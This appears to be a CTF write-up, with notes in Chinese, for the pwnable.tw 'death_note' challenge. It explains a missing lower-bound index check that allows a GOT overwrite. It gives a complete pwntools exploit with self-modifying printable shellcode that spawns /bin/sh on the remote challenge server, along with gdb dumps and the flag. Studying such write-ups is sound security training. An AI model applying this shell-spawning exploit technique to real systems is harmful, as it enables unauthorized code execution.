# death_note


```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Canary only

add_note 要是 is_printable ，並且只有檢查上限，沒檢查下限，可以從 bss 往下寫到 got

這些選擇把 puts 的函數寫掉



```c=

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int nn_read; // eax

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      nn_read = read_int();
      if ( nn_read != 2 )
        break;
      show_note();
    }
    if ( nn_read > 2 )
    {
      if ( nn_read == 3 )
      {
        del_note();
      }
      else
      {
        if ( nn_read == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( nn_read != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}


unsigned int add_note()
{
  int v1; // [esp+8h] [ebp-60h]
  char s[80]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v3; // [esp+5Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  printf("Name :");
  read_input(s, 80u);
  if ( !is_printable(s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
  *(&note + v1) = strdup(s);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
}
```





```c=
.got:08049FFC ; ===========================================================================
.got:08049FFC
.got:08049FFC ; Segment type: Pure data
.got:08049FFC ; Segment permissions: Read/Write
.got:08049FFC _got            segment dword public 'DATA' use32
.got:08049FFC                 assume cs:_got
.got:08049FFC                 ;org 8049FFCh
.got:08049FFC __gmon_start___ptr dd offset __imp___gmon_start__
.got:08049FFC                                         ; DATA XREF: _init_proc+F↑r
.got:08049FFC                                         ; __gmon_start__↑r
.got:08049FFC _got            ends
.got:08049FFC
.got.plt:0804A000 ; ===========================================================================
.got.plt:0804A000
.got.plt:0804A000 ; Segment type: Pure data
.got.plt:0804A000 ; Segment permissions: Read/Write
.got.plt:0804A000 _got_plt        segment dword public 'DATA' use32
.got.plt:0804A000                 assume cs:_got_plt
.got.plt:0804A000                 ;org 804A000h
.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
.got.plt:0804A000                                         ; DATA XREF: _init_proc+9↑o
.got.plt:0804A000                                         ; __libc_csu_init+9↑o ...
.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048460↑r
.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048460+6↑r
.got.plt:0804A00C off_804A00C     dd offset read          ; DATA XREF: _read↑r
.got.plt:0804A010 off_804A010     dd offset printf        ; DATA XREF: _printf↑r
.got.plt:0804A014 off_804A014     dd offset free          ; DATA XREF: _free↑r
.got.plt:0804A018 off_804A018     dd offset strdup        ; DATA XREF: _strdup↑r
.got.plt:0804A01C off_804A01C     dd offset __stack_chk_fail
.got.plt:0804A01C                                         ; DATA XREF: ___stack_chk_fail↑r
.got.plt:0804A020 off_804A020     dd offset puts          ; DATA XREF: _puts↑r
.got.plt:0804A024 off_804A024     dd offset exit          ; DATA XREF: _exit↑r
.got.plt:0804A028 off_804A028     dd offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0804A02C off_804A02C     dd offset __libc_start_main
.got.plt:0804A02C                                         ; DATA XREF: ___libc_start_main↑r
.got.plt:0804A030 off_804A030     dd offset setvbuf       ; DATA XREF: _setvbuf↑r
.got.plt:0804A034 off_804A034     dd offset atoi          ; DATA XREF: _atoi↑r
.got.plt:0804A034 _got_plt        ends
.got.plt:0804A034
.data:0804A038 ; ===========================================================================
.data:0804A038
.data:0804A038 ; Segment type: Pure data
.data:0804A038 ; Segment permissions: Read/Write
.data:0804A038 _data           segment dword public 'DATA' use32
.data:0804A038                 assume cs:_data
.data:0804A038                 ;org 804A038h
.data:0804A038                 public __data_start ; weak
.data:0804A038 __data_start    db    0                 ; Alternative name is '__data_start'
.data:0804A038                                         ; data_start
.data:0804A039                 db    0
.data:0804A03A                 db    0
.data:0804A03B                 db    0
.data:0804A03C                 public __dso_handle
.data:0804A03C __dso_handle    db    0
.data:0804A03D                 db    0
.data:0804A03E                 db    0
.data:0804A03F                 db    0
.data:0804A03F _data           ends
.data:0804A03F
.bss:0804A040 ; ===========================================================================
.bss:0804A040
.bss:0804A040 ; Segment type: Uninitialized
.bss:0804A040 ; Segment permissions: Read/Write
.bss:0804A040 _bss            segment align_32 public 'BSS' use32
.bss:0804A040                 assume cs:_bss
.bss:0804A040                 ;org 804A040h
.bss:0804A040                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:0804A040                 public __bss_start
.bss:0804A040 ; FILE *_bss_start
.bss:0804A040 __bss_start     dd ?                    ; DATA XREF: LOAD:080482C8↑o
.bss:0804A040                                         ; deregister_tm_clones+5↑o ...
.bss:0804A040                                         ; Alternative name is '__TMC_END__'
.bss:0804A040                                         ; stdin@@GLIBC_2.0
.bss:0804A040                                         ; _edata
.bss:0804A040                                         ; Copy of shared data
.bss:0804A044                 public stdout@@GLIBC_2_0
.bss:0804A044 ; FILE *stdout
.bss:0804A044 stdout@@GLIBC_2_0 dd ?                  ; DATA XREF: LOAD:080482A8↑o
.bss:0804A044                                         ; main+11↑r
.bss:0804A044                                         ; Alternative name is 'stdout'
.bss:0804A044                                         ; Copy of shared data
.bss:0804A048 completed_7200  db ?                    ; DATA XREF: __do_global_dtors_aux↑r
.bss:0804A048                                         ; __do_global_dtors_aux+14↑w
.bss:0804A049                 align 20h
.bss:0804A060                 public note
.bss:0804A060 ; void *note
.bss:0804A060 note            dd ?                    ; DATA XREF: add_note+91↑w
.bss:0804A060                                         ; del_note+41↑r ...
```


puts - bss note 
(0x0804a020 - 0x0804a060) / 4 = -16




分成幾個步驟建構 `execve('/bin/sh',0,0)` shellcode

printable shellcode 工具使用上有些侷限，這邊 input 長度限制在 80 ，雖然理論上可以實現多次寫入







```python=
from pwn import *

r = remote("chall.pwnable.tw", 10201)

sc = asm(
    """
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
    /* set ebx point to /bin/sh */

    /* self modify */
    /*
    edx point to our input 
    $edx   : 0x0804b1a0  →  "jhh///sh/binT[RXjSZ(P'(P(jpZ0P(QX404;QZ C"
    */
    push edx
    pop eax                     /* eax = edx */
    push 0x53
    pop edx                     /* edx = 0x53                   */
    sub byte ptr [eax+39],dl    /* [eax+39] = [eax+39] - 0x53     */
    sub byte ptr [eax+40],dl    /* [eax+40] = [eax+40] - 0x53     */
    push 0x70
    pop edx
    xor byte ptr [eax+40],dl    /* [eax+40] = [eax+40] ^ 0x70     */
    /* 
    hex(((0x20-0x53))& 0xFF)  = 0xcd
    hex(((0x43-0x53)^0x70)& 0xFF) = 0x80
    */

    /* set eax = 0x0b */
    push ecx
    pop eax
    xor al, 0x30
    xor al, 0x3b

    
    /* edx = 0 */
    /* ecx = 0 */
    push ecx
    pop edx
"""
    ) + b"\x20\x43"

print(sc)
r.sendline('1')
r.recvuntil('Index :')
r.sendline('-16')
r.recvuntil('Name :')
r.sendline(sc)

sleep(1)
r.sendline("whoami")
r.interactive()
```





```bash=
gef➤  x/32wx 0x0804A000 
0x804a000:      0x08049f14      0xf7ffda40      0xf7fd8ff0      0xf7e7f170
0x804a010 <printf@got.plt>:     0xf7dcca90      0x08048496      0xf7e10220      0x080484b6
0x804a020 <puts@got.plt>:       0x0804b1a0      0x080484d6      0xf7e17680      0xf7d96560
0x804a030 <setvbuf@got.plt>:    0xf7de89b0      0xf7dadc40      0x00000000      0x00000000
0x804a040 <stdin@@GLIBC_2.0>:   0xf7f9f620      0xf7f9fda0      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060 <note>:       0x00000000      0x00000000      0x00000000      0x00000000
0x804a070 <note+16>:    0x00000000      0x00000000      0x00000000      0x00000000
gef➤  x/32wx 0x0804b1a0
0x804b1a0:      0x2f68686a      0x68732f2f      0x6e69622f      0x58525b54
0x804b1b0:      0x285a536a      0x50282750      0x5a706a28      0x51285030
0x804b1c0:      0x34303458      0x205a513b      0x00000043      0x00021e39
0x804b1d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b1e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b1f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b200:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b210:      0x00000000      0x00000000      0x00000000      0x00000000
gef➤  x/32i 0x0804b1a0
=> 0x804b1a0:   push   0x68
   0x804b1a2:   push   0x732f2f2f
   0x804b1a7:   push   0x6e69622f
   0x804b1ac:   push   esp
   0x804b1ad:   pop    ebx
   0x804b1ae:   push   edx
   0x804b1af:   pop    eax
   0x804b1b0:   push   0x53
   0x804b1b2:   pop    edx
   0x804b1b3:   sub    BYTE PTR [eax+0x27],dl
   0x804b1b6:   sub    BYTE PTR [eax+0x28],dl
   0x804b1b9:   push   0x70
   0x804b1bb:   pop    edx
   0x804b1bc:   xor    BYTE PTR [eax+0x28],dl
   0x804b1bf:   push   ecx
   0x804b1c0:   pop    eax
   0x804b1c1:   xor    al,0x30
   0x804b1c3:   xor    al,0x3b
   0x804b1c5:   push   ecx
   0x804b1c6:   pop    edx
   0x804b1c7:   and    BYTE PTR [ebx+0x0],al
   0x804b1ca:   add    BYTE PTR [eax],al
   0x804b1cc:   cmp    DWORD PTR [esi],ebx
   0x804b1ce:   add    al,BYTE PTR [eax]
   0x804b1d0:   add    BYTE PTR [eax],al
   0x804b1d2:   add    BYTE PTR [eax],al
```











>FLAG{sh3llc0d3_is_s0_b34ut1ful}